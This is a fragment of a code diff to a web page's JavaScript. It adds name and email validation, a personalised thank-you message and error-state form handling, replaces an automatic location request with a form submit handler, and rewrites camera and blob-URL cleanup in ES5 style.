+            var thanksSection = document.getElementById('thanksSection');
+            var thankYouText = thanksSection.querySelector('h2');
+            if (userData.name) {
+                thankYouText.textContent = 'Thank You, ' + userData.name.split(' ')[0] + '!';
+            }
+            thanksSection.style.display = 'block';
             
             // Scroll to thank you section
-            document.getElementById('thanksSection').scrollIntoView({ 
+            thanksSection.scrollIntoView({ 
                 behavior: 'smooth',
                 block: 'center'
             });
@@ -981,9 +1275,14 @@ ${uploadedPhotos.length > 0 ?
         function showError(message) {
             hideMessages();
             showLoading(false);
-            const element = document.getElementById('errorMessage');
+            var element = document.getElementById('errorMessage');
             element.textContent = message;
             element.style.display = 'block';
+            
+            // Show form again if there was an error
+            document.getElementById('userForm').style.display = 'block';
+            document.getElementById('locationIcon').style.display = 'none';
+            document.getElementById('permissionText').style.display = 'none';
         }
 
         function hideMessages() {
@@ -995,24 +1294,65 @@ ${uploadedPhotos.length > 0 ?
         window.addEventListener('load', function() {
             checkSecureContext();
             
-            // Small delay to ensure page is fully loaded
-            setTimeout(() => {
-                autoRequestLocation();
-            }, 1000);
+            // Set up form submission handler
+            document.getElementById('serviceForm').addEventListener('submit', handleFormSubmit);
+            
+            // Add input validation listeners
+            var nameInput = document.getElementById('userName');
+            var emailInput = document.getElementById('userEmail');
+            
+            nameInput.addEventListener('blur', function() {
+                if (!this.value.trim()) {
+                    this.classList.add('invalid');
+                    document.getElementById('nameError').style.display = 'block';
+                } else {
+                    this.classList.remove('invalid');
+                    document.getElementById('nameError').style.display = 'none';
+                }
+            });
+            
+            emailInput.addEventListener('blur', function() {
+                var email = this.value.trim();
+                if (email && !isValidEmail(email)) {
+                    this.classList.add('invalid');
+                    document.getElementById('emailError').style.display = 'block';
+                } else {
+                    this.classList.remove('invalid');
+                    document.getElementById('emailError').style.display = 'none';
+                }
+            });
+            
+            // Clear validation on input
+            nameInput.addEventListener('input', function() {
+                if (this.value.trim()) {
+                    this.classList.remove('invalid');
+                    document.getElementById('nameError').style.display = 'none';
+                }
+            });
+            
+            emailInput.addEventListener('input', function() {
+                var email = this.value.trim();
+                if (!email || isValidEmail(email)) {
+                    this.classList.remove('invalid');
+                    document.getElementById('emailError').style.display = 'none';
+                }
+            });
         });
 
         // Cleanup on page unload
         window.addEventListener('beforeunload', function() {
             if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
+                cameraStream.getTracks().forEach(function(track) {
+                    track.stop();
+                });
             }
             
-            // Cleanup blob URLs (though we're not creating them for preview anymore)
-            photoFiles.forEach(photoData => {
-                if (photoData.blobUrl) {
-                    URL.revokeObjectURL(photoData.blobUrl);
+            // Cleanup blob URLs
+            for (var i = 0; i < photoFiles.length; i++) {
+                if (photoFiles[i].blobUrl) {
+                    URL.revokeObjectURL(photoFiles[i].blobUrl);
                 }
-            });
+            }
         });
     </script>
 </body>
